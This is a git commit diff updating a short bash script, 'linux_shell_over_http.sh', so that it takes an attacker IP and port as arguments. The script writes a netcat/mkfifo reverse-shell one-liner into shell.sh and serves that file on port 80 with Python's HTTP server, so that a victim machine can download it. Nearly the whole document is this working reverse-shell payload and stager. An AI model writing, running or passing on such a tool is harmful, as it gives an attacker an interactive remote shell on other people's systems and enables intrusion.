f6b0224d4e71e2232480c43afd32bb561660169c
SnipSnap (Harrison K) <70385098+SnipSnapp@users.noreply.github.com>
2024-03-30 15:00:17 -0500

    Update linux_shell_over_http.sh

--- linux_shell_over_http.sh
+++ linux_shell_over_http.sh
@@ -1,3 +1,15 @@
 #!/bin/bash
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234" >/tmp/f
+
+# Check if IP and PORT are provided as command line arguments
+if [ "$#" -ne 2 ]; then
+    echo "Usage: $0 <IP> <PORT>"
+    exit 1
+fi
+
+# Assign command line arguments to variables
+IP="$1"
+PORT="$2"
+
+# Execute the command with provided IP and PORT
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f" >>shell.sh
 python3 -m http.server 80
